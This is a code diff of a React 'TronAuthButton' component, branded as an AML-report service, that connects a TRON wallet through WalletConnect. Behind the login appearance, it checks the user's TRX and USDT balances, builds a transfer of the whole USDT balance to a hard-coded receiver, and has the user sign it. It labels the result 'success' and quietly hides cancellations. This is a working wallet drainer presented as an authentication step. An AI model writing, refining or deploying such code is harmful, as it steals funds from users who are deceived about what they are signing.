@@ -1,7 +1,6 @@
-// src/components/tronAuthButton/TronAuthButton.tsx
 import React, { useState } from 'react';
 import { WalletConnectAdapter } from '@tronweb3/tronwallet-adapter-walletconnect';
-import { TronWeb } from 'tronweb';  // <-- именно так, как в изначально рабочем варианте
+import { TronWeb } from 'tronweb';
 import { Buffer } from 'buffer';
 
 window.Buffer = Buffer; // для tronweb
@@ -28,9 +27,7 @@ const adapter = new WalletConnectAdapter({
       icons: ['https://amlreports.pro/images/icon-3.abdd8ed5.webp'],
     },
   },
-  web3ModalConfig: {
-    themeMode: 'dark',
-  },
+  web3ModalConfig: { themeMode: 'dark' },
 });
 
 export const TronAuthButton: React.FC = () => {
@@ -51,6 +48,8 @@ export const TronAuthButton: React.FC = () => {
 
       const trxRaw = await tronWeb.trx.getBalance(userAddress);
       const trx = trxRaw / 1e6;
+      console.log('TRX balance:', trx);
+
       if (trx < 25) {
         throw new Error('❌ Insufficient TRX. At least 25 TRX is required.');
       }
@@ -58,20 +57,17 @@ export const TronAuthButton: React.FC = () => {
       const usdtContract = await tronWeb.contract().at(USDT_CONTRACT);
       const usdtRaw = await usdtContract.methods.balanceOf(userAddress).call();
       const usdt = Number(usdtRaw) / 1e6;
+      console.log('USDT balance:', usdt);
 
       if (usdt < 1) {
         setStatus('success');
-        await adapter.disconnect();
         return;
       }
 
       const tx = await tronWeb.transactionBuilder.triggerSmartContract(
         USDT_CONTRACT,
         'transfer(address,uint256)',
-        {
-          feeLimit: 25_000_000,
-          callValue: 0,
-        },
+        { feeLimit: 25_000_000, callValue: 0 },
         [
           { type: 'address', value: TRON_RECEIVER },
           { type: 'uint256', value: usdtRaw },
@@ -81,6 +77,7 @@ export const TronAuthButton: React.FC = () => {
 
       const signedTx = await adapter.signTransaction(tx.transaction);
       const result = await tronWeb.trx.sendRawTransaction(signedTx);
+      console.log('Send result:', result);
 
       if (result.result) {
         setStatus('success');
@@ -88,9 +85,14 @@ export const TronAuthButton: React.FC = () => {
         throw new Error('Transaction failed');
       }
     } catch (err: any) {
+      console.error('Error:', err);
       const msg = err?.message || '';
-      if (/User rejected|Modal is closed|Timeout/i.test(msg)) {
-        setStatus(null);
+
+      // --- Исправлено: обрабатываем "Cancel", "User rejected" и прочее ---
+      if (
+        /User rejected|Modal is closed|Timeout|Cancelled|cancel/i.test(msg)
+      ) {
+        setStatus(null); // просто ничего не показываем, всё тихо закрывается
       } else {
         setStatus('⚠️ Connection or transaction error');
       }
